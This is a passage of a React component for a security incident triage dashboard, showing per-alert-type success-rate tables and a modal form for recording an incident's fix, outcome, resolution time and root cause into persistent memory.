                          <td>{c.timesUsed}x</td>
                          <td>
                            {c.lowSampleSize ? (
                              <span className="tag-warning">Low sample (&lt;2)</span>
                            ) : (
                              <span className="tag-ok">Validated</span>
                            )}
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>

            {/* Per-Type Breakdown Accordion/Table */}
            <div className="per-type-section">
              <h3 className="section-subtitle">Per-Incident-Type Performance</h3>
              <div className="table-responsive">
                <table className="scoreboard-table">
                  <thead>
                    <tr>
                      <th>Alert Type</th>
                      <th>Total</th>
                      <th>Resolved</th>
                      <th>Success Rate</th>
                      <th>Avg Time</th>
                    </tr>
                  </thead>
                  <tbody>
                    {(scoreboard?.byAlertType || []).map((t) => (
                      <tr key={t.alertType}>
                        <td className="mono">{t.alertType}</td>
                        <td>{t.count}</td>
                        <td>{t.resolvedCount}</td>
                        <td>
                          <span className={t.successRate >= 80 ? 'text-green' : t.successRate > 0 ? 'text-amber' : 'text-red'}>
                            {t.successRate}%
                          </span>
                        </td>
                        <td>{t.avgTimeToResolve}m</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        </section>
      </div>
      ) : (
        <MemoryImpactView
          key={analyticsKey}
          onSwitchToTriage={() => setActiveTab('triage')}
        />
      )}

      {/* RESOLVE MODAL */}
      {showResolveModal && (
        <div className="modal-backdrop">
          <div className="modal-card">
            <div className="modal-header">
              <h3>Resolve Incident & Update Institutional Memory</h3>
              <button className="btn-close" onClick={() => setShowResolveModal(false)}>✕</button>
            </div>

            <form onSubmit={handleSaveResolution} className="modal-body">
              <p className="modal-intro">
                Resolving incident <strong>{resolvingIncident?.id}</strong> updates the Scoreboard live
                and retains this outcome into Hindsight persistent memory.
              </p>

              <div className="form-group">
                <label>Fix Applied:</label>
                <input
                  type="text"
                  value={resolveFix}
                  onChange={(e) => setResolveFix(e.target.value)}
                  placeholder="e.g. Enforce IMDSv2 and deploy egress policy"
                  required
                />
              </div>

              <div className="input-row">
                <div className="form-group flex-1">
                  <label>Outcome:</label>
                  <select
                    value={resolveOutcome}
                    onChange={(e) => setResolveOutcome(e.target.value)}
                    className="modal-select"
                  >
                    <option value="success">Success (Fix succeeded)</option>
                    <option value="partial">Partial (Mitigated with issues)</option>
                    <option value="failed">Failed (Ineffective)</option>
                  </select>
                </div>

                <div className="form-group flex-1">
                  <label>Time to Resolve (Minutes):</label>
                  <input
                    type="number"
                    min="1"
                    max="1000"
                    value={resolveTime}
                    onChange={(e) => setResolveTime(e.target.value)}
                    required
                  />
                </div>
              </div>

              <div className="form-group">
                <label>Verified Root Cause:</label>
                <input
                  type="text"
                  value={resolveRootCause}
                  onChange={(e) => setResolveRootCause(e.target.value)}
                  placeholder="e.g. Unsanitized webhook parameters allowed SSRF"
                  required
                />
              </div>

              <div className="modal-footer">
                <button
                  type="button"
                  className="btn-cancel"
                  onClick={() => setShowResolveModal(false)}
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="btn-save-resolve"
                  disabled={savingResolution}
                >
                  {savingResolution ? 'Saving to Hindsight...' : 'Save & Retain Memory'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}
